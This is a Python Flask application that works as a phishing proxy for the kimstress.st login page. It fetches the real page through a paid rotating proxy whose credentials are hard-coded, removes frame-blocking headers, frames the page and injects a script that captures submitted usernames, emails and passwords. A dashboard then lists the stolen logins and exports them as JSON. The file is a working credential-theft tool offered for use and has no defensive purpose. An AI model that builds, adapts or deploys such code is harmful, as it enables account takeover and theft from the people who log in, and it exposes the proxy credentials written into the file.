from flask import Flask, render_template_string, request, jsonify, Response, session
from flask_cors import CORS
import requests
from urllib.parse import urlparse
import logging
import os
import time
import json
from datetime import datetime, timedelta
from functools import wraps

# Proxy Configuration
PROXY_CONFIG = {
    'server': 'http://change4.owlproxy.com:7778',
    'username': 'IIOL0QVOzN30_custom_zone_SG_st__city_sid_79312845_time_5',
    'password': '2272641'
}
PROXY_ENABLED = True

app = Flask(__name__)
app.secret_key = os.urandom(24)  # For session management
CORS(app)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# HTML Template with login form capture
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kimstress Login - Secure Proxy</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: 1fr 350px;
            gap: 20px;
        }
        .main-content {
            background: white;
            border-radius: 15px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            overflow: hidden;
        }
        .sidebar {
            background: white;
            border-radius: 15px;
            padding: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            height: fit-content;
        }
        header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 20px 30px;
            color: white;
        }
        header h1 {
            font-size: 24px;
            margin-bottom: 5px;
        }
        .proxy-badge {
            background: rgba(255,255,255,0.2);
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 12px;
            display: inline-block;
            margin-top: 10px;
        }
        .status-bar {
            background: #f8f9fa;
            padding: 15px 30px;
            border-bottom: 1px solid #e0e0e0;
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
        }
        .status-item {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 13px;
        }
        .status-indicator {
            width: 10px;
            height: 10px;
            border-radius: 50%;
        }
        .online { background-color: #28a745; box-shadow: 0 0 10px #28a745; }
        .offline { background-color: #dc3545; }
        .iframe-container {
            position: relative;
            height: 600px;
            background: #f5f5f5;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
            background: white;
        }
        .controls {
            padding: 20px 30px;
            background: white;
            border-top: 1px solid #e0e0e0;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.3s;
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(102,126,234,0.4); }
        .btn-danger { background: linear-gradient(135deg, #dc3545 0%, #c82333 100%); }
        .btn-success { background: linear-gradient(135deg, #28a745 0%, #218838 100%); }
        
        .login-data {
            margin-top: 20px;
        }
        .login-item {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 10px;
            border-left: 4px solid #667eea;
        }
        .login-time {
            font-size: 11px;
            color: #666;
            margin-bottom: 5px;
        }
        .login-detail {
            font-size: 13px;
            margin: 5px 0;
            word-break: break-all;
        }
        .login-detail strong {
            color: #333;
            width: 70px;
            display: inline-block;
        }
        .empty-state {
            text-align: center;
            padding: 40px 20px;
            color: #999;
            font-size: 14px;
        }
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 25px;
            border-radius: 10px;
            color: white;
            font-weight: 500;
            z-index: 9999;
            animation: slideIn 0.3s ease;
        }
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        .loading-overlay {
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(255,255,255,0.9);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .stats-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 15px;
            border-radius: 10px;
            text-align: center;
        }
        .stat-number {
            font-size: 24px;
            font-weight: bold;
        }
        .stat-label {
            font-size: 12px;
            opacity: 0.9;
        }
        @media (max-width: 768px) {
            .container { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="main-content">
            <header>
                <h1>Kimstress.st Login Portal</h1>
                <div class="proxy-badge">🌐 Secure Proxy • Singapore • Rotating IP</div>
            </header>
            
            <div class="status-bar">
                <div class="status-item">
                    <span class="status-indicator online" id="proxyIndicator"></span>
                    <span id="proxyStatus">Proxy Connected</span>
                </div>
                <div class="status-item">
                    <span>📍</span>
                    <span id="proxyLocation">Singapore</span>
                </div>
                <div class="status-item">
                    <span>🔄</span>
                    <span id="lastUpdate">Just now</span>
                </div>
            </div>
            
            <div class="iframe-container">
                <iframe 
                    id="mainIframe"
                    src="/proxy?url=https://kimstress.st/login"
                    sandbox="allow-forms allow-scripts allow-same-origin allow-popups allow-modals"
                    allow="camera; microphone; fullscreen">
                </iframe>
                <div class="loading-overlay" id="loadingOverlay">
                    <div class="spinner"></div>
                </div>
            </div>
            
            <div class="controls">
                <button onclick="reloadIframe()" class="btn">⟳ Reload</button>
                <button onclick="clearHistory()" class="btn btn-danger">🗑 Clear History</button>
                <button onclick="exportData()" class="btn btn-success">📥 Export Data</button>
                <button onclick="testConnection()" class="btn">🌐 Test Proxy</button>
            </div>
        </div>
        
        <div class="sidebar">
            <h3 style="margin-bottom: 15px; color: #333;">📋 Captured Login Data</h3>
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-number" id="totalLogins">0</div>
                    <div class="stat-label">Total Logins</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number" id="todayLogins">0</div>
                    <div class="stat-label">Today</div>
                </div>
            </div>
            <div id="loginDataList" class="login-data">
                <div class="empty-state">
                    📭 No login data captured yet
                </div>
            </div>
        </div>
    </div>

    <div id="notification" class="notification" style="display: none;"></div>

    <script>
        let loginData = [];
        let proxyStatus = 'online';

        // Load saved data
        fetch('/get-logins')
            .then(res => res.json())
            .then(data => {
                loginData = data;
                updateLoginDisplay();
            });

        // Listen for messages from iframe
        window.addEventListener('message', function(event) {
            if (event.data.type === 'login') {
                saveLoginData(event.data.data);
            }
        });

        function saveLoginData(data) {
            fetch('/save-login', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            })
            .then(res => res.json())
            .then(data => {
                loginData = data;
                updateLoginDisplay();
                showNotification('✅ Login data captured!', 'success');
            });
        }

        function updateLoginDisplay() {
            const container = document.getElementById('loginDataList');
            const totalLogins = document.getElementById('totalLogins');
            const todayLogins = document.getElementById('todayLogins');
            
            if (loginData.length === 0) {
                container.innerHTML = '<div class="empty-state">📭 No login data captured yet</div>';
                totalLogins.textContent = '0';
                todayLogins.textContent = '0';
                return;
            }

            totalLogins.textContent = loginData.length;
            
            // Count today's logins
            const today = new Date().toDateString();
            const todayCount = loginData.filter(d => new Date(d.timestamp).toDateString() === today).length;
            todayLogins.textContent = todayCount;

            let html = '';
            loginData.slice().reverse().forEach(data => {
                const time = new Date(data.timestamp).toLocaleString();
                html += `
                    <div class="login-item">
                        <div class="login-time">🕐 ${time}</div>
                        ${data.username ? `<div class="login-detail"><strong>Username:</strong> ${data.username}</div>` : ''}
                        ${data.email ? `<div class="login-detail"><strong>Email:</strong> ${data.email}</div>` : ''}
                        ${data.password ? `<div class="login-detail"><strong>Password:</strong> ${data.password}</div>` : ''}
                        <div class="login-detail"><strong>IP:</strong> ${data.ip || 'N/A'}</div>
                    </div>
                `;
            });
            container.innerHTML = html;
        }

        function reloadIframe() {
            document.getElementById('loadingOverlay').style.display = 'flex';
            document.getElementById('mainIframe').src = '/proxy?url=https://kimstress.st/login&t=' + Date.now();
        }

        function clearHistory() {
            if (confirm('Clear all login history?')) {
                fetch('/clear-logins', {method: 'POST'})
                    .then(res => res.json())
                    .then(data => {
                        loginData = [];
                        updateLoginDisplay();
                        showNotification('🗑 History cleared', 'success');
                    });
            }
        }

        function exportData() {
            fetch('/export-logins')
                .then(res => res.blob())
                .then(blob => {
                    const url = window.URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = `logins_${new Date().toISOString()}.json`;
                    a.click();
                });
        }

        function testConnection() {
            fetch('/test-proxy')
                .then(res => res.json())
                .then(data => {
                    if (data.status === 'success') {
                        document.getElementById('proxyLocation').textContent = data.location;
                        document.getElementById('proxyIndicator').className = 'status-indicator online';
                        document.getElementById('proxyStatus').textContent = 'Proxy Connected';
                        showNotification(`✅ Proxy OK - IP: ${data.ip}`, 'success');
                    } else {
                        throw new Error(data.message);
                    }
                })
                .catch(err => {
                    document.getElementById('proxyIndicator').className = 'status-indicator offline';
                    document.getElementById('proxyStatus').textContent = 'Proxy Disconnected';
                    showNotification('❌ Proxy connection failed', 'error');
                });
        }

        function showNotification(msg, type) {
            const notif = document.getElementById('notification');
            notif.style.display = 'block';
            notif.textContent = msg;
            notif.style.background = type === 'success' ? '#28a745' : '#dc3545';
            setTimeout(() => notif.style.display = 'none', 3000);
        }

        // Auto-test connection
        testConnection();
        setInterval(testConnection, 30000);

        // Monitor iframe for form submissions
        const iframe = document.getElementById('mainIframe');
        iframe.onload = function() {
            document.getElementById('loadingOverlay').style.display = 'none';
            
            // Inject login capture script
            try {
                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                const script = iframeDoc.createElement('script');
                script.textContent = `
                    document.addEventListener('submit', function(e) {
                        const form = e.target;
                        const data = {};
                        
                        // Capture form data
                        form.querySelectorAll('input').forEach(input => {
                            if (input.type === 'password') data.password = input.value;
                            else if (input.type === 'email') data.email = input.value;
                            else if (input.name === 'username') data.username = input.value;
                        });
                        
                        if (Object.keys(data).length > 0) {
                            data.timestamp = new Date().toISOString();
                            window.parent.postMessage({type: 'login', data: data}, '*');
                        }
                    });
                `;
                iframeDoc.body.appendChild(script);
            } catch(e) {
                console.log('Cannot access iframe content');
            }
        };
    </script>
</body>
</html>
"""

# In-memory storage for login data
login_database = []

def get_proxy_config():
    """Get proxy configuration with error handling"""
    if not PROXY_ENABLED:
        return None
    try:
        parsed = urlparse(PROXY_CONFIG['server'])
        proxy_with_auth = f"{parsed.scheme}://{PROXY_CONFIG['username']}:{PROXY_CONFIG['password']}@{parsed.netloc}"
        return {'http': proxy_with_auth, 'https': proxy_with_auth}
    except Exception as e:
        logger.error(f"Proxy config error: {e}")
        return None

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/proxy')
def proxy():
    target_url = request.args.get('url', 'https://kimstress.st/login')
    t = request.args.get('t', '')  # Cache buster
    
    try:
        proxies = get_proxy_config()
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cargahe'
        }
        
        logger.info(f"Fetching {target_url} via proxy: {PROXY_CONFIG['server'] if proxies else 'direct'}")
        
        # Make request with proxy
        response = requests.get(
            target_url,
            headers=headers,
            timeout=30,
            proxies=proxies,
            allow_redirects=True,
            verify=False  # For testing only, remove in production
        )
        
        # Create response
        proxy_response = Response(
            response.content,
            status=response.status_code,
            content_type=response.headers.get('Content-Type', 'text/html')
        )
        
        # Add CORS headers
        proxy_response.headers['Access-Control-Allow-Origin'] = '*'
        proxy_response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
        proxy_response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        
        # Remove frame restrictions
        if 'X-Frame-Options' in proxy_response.headers:
            del proxy_response.headers['X-Frame-Options']
        if 'Content-Security-Policy' in proxy_response.headers:
            # Modify CSP to allow iframe
            csp = proxy_response.headers['Content-Security-Policy']
            csp = csp.replace("frame-ancestors 'none'", "frame-ancestors *")
            proxy_response.headers['Content-Security-Policy'] = csp
            
        return proxy_response
        
    except requests.exceptions.ProxyError as e:
        logger.error(f"Proxy error: {e}")
        return "Proxy connection error. Please check proxy settings.", 502
    except requests.exceptions.ConnectionError as e:
        logger.error(f"Connection error: {e}")
        return "Cannot connect to target website. Retrying...", 502
    except requests.exceptions.Timeout as e:
        logger.error(f"Timeout error: {e}")
        return "Request timeout. Please try again.", 504
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        return f"Error loading page: {str(e)}", 500

@app.route('/save-login', methods=['POST'])
def save_login():
    """Save login data"""
    global login_database
    try:
        data = request.json
        data['timestamp'] = datetime.now().isoformat()
        data['ip'] = request.remote_addr
        
        # Add proxy info
        data['proxy'] = PROXY_CONFIG['server'] if PROXY_ENABLED else 'direct'
        data['location'] = 'Singapore'
        
        login_database.append(data)
        
        # Keep only last 100 entries
        if len(login_database) > 100:
            login_database = login_database[-100:]
            
        logger.info(f"Login data saved: {data.get('username', 'N/A')}")
        return jsonify(login_database)
    except Exception as e:
        logger.error(f"Error saving login: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/get-logins')
def get_logins():
    """Get all saved login data"""
    return jsonify(login_database)

@app.route('/clear-logins', methods=['POST'])
def clear_logins():
    """Clear all login data"""
    global login_database
    login_database = []
    return jsonify({"success": True})

@app.route('/export-logins')
def export_logins():
    """Export login data as JSON"""
    from flask import send_file
    import io
    
    data = {
        'exports': login_database,
        'total': len(login_database),
        'exported_at': datetime.now().isoformat(),
        'proxy': PROXY_CONFIG['server'] if PROXY_ENABLED else None
    }
    
    buffer = io.BytesIO()
    buffer.write(json.dumps(data, indent=2).encode())
    buffer.seek(0)
    
    return send_file(
        buffer,
        as_attachment=True,
        download_name=f'logins_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json',
        mimetype='application/json'
    )

@app.route('/test-proxy')
def test_proxy():
    """Test proxy connection"""
    try:
        proxies = get_proxy_config()
        if not proxies:
            return jsonify({"status": "error", "message": "Proxy disabled"})
        
        # Test proxy with multiple endpoints
        endpoints = [
            'http://httpbin.org/ip',
            'https://api.ipify.org?format=json',
            'http://ip-api.com/json'
        ]
        
        for endpoint in endpoints:
            try:
                response = requests.get(endpoint, proxies=proxies, timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    ip = data.get('origin', data.get('ip', 'Unknown'))
                    
                    # Get location
                    try:
                        loc_res = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
                        if loc_res.status_code == 200:
                            loc_data = loc_res.json()
                            location = f"{loc_data.get('city', 'Singapore')}, {loc_data.get('country', 'Singapore')}"
                        else:
                            location = "Singapore"
                    except:
                        location = "Singapore"
                    
                    return jsonify({
                        "status": "success",
                        "ip": ip,
                        "location": location,
                        "proxy": PROXY_CONFIG['server']
                    })
            except:
                continue
        
        return jsonify({"status": "error", "message": "All proxy tests failed"})
        
    except Exception as e:
        logger.error(f"Proxy test error: {e}")
        return jsonify({"status": "error", "message": str(e)})

@app.route('/health')
def health():
    """Health check"""
    proxy_status = "connected" if get_proxy_config() else "disabled"
    try:
        test_proxy()
        proxy_working = True
    except:
        proxy_working = False
    
    return jsonify({
        "status": "healthy",
        "proxy_enabled": PROXY_ENABLED,
        "proxy_server": PROXY_CONFIG['server'],
        "proxy_status": proxy_status,
        "proxy_working": proxy_working,
        "logins_captured": len(login_database),
        "timestamp": datetime.now().isoformat()
    })

@app.route('/proxy-status')
def proxy_status():
    """Get detailed proxy status"""
    try:
        proxies = get_proxy_config()
        if not proxies:
            return jsonify({"enabled": False, "status": "disabled"})
        
        # Test proxy speed
        start = time.time()
        response = requests.get('http://httpbin.org/get', proxies=proxies, timeout=5)
        latency = int((time.time() - start) * 1000)
        
        return jsonify({
            "enabled": True,
            "status": "connected",
            "server": PROXY_CONFIG['server'],
            "location": "Singapore",
            "latency_ms": latency,
            "last_check": datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({
            "enabled": True,
            "status": "error",
            "error": str(e)
        })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("="*60)
    print("🚀 Kimstress Login Proxy Server")
    print("="*60)
    print(f"📍 Proxy: {PROXY_CONFIG['server']}")
    print(f"🌏 Location: Singapore")
    print(f"📊 Login capture: Enabled")
    print(f"🔗 URL: http://localhost:{port}")
    print("="*60)
    
    app.run(host='0.0.0.0', port=port, debug=True)
